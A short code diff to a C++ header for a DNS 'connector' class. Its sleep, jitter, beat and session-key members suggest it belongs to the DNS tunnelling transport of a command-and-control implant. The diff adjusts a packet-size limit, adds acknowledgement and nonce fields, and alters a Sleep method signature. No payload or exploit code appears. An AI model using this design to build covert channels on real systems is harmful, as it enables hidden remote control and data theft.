@@ -48,7 +48,7 @@ class ConnectorDNS : public Connector
 {
 public:
 	static const ULONG kDefaultPktSize = 100;
-	static const ULONG kMaxPktSize = 200;
+	static const ULONG kMaxPktSize = 120;
 	static const ULONG kMaxLabelSize = 63;
 	static const ULONG kDefaultLabelSize = 48;
 	static const ULONG kMaxResolvers = 16;
@@ -91,6 +91,8 @@ private:
 
 	ULONG lastUpTotal = 0;
 	ULONG lastDownTotal = 0;
+	ULONG pendingDownAck = 0;
+	ULONG pendingDownNonce = 0;
 
 	DNSFUNC* functions = NULL;
 
@@ -147,7 +149,7 @@ public:
 
 	BOOL SetProfile(void* profile, BYTE* beat, ULONG beatSize) override;
 	void Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey) override;
-	void Sleep(HANDLE wakeupEvent, ULONG workingSleep, ULONG sleepDelay, ULONG jitter, BOOL hasOutput, DWORD pollIntervalMs = 0);
+	void Sleep(HANDLE wakeupEvent, ULONG workingSleep, ULONG sleepDelay, ULONG jitter, BOOL hasOutput, DWORD pollIntervalMs) override;
 	void CloseConnector() override;
 
 	BYTE* RecvData() override;
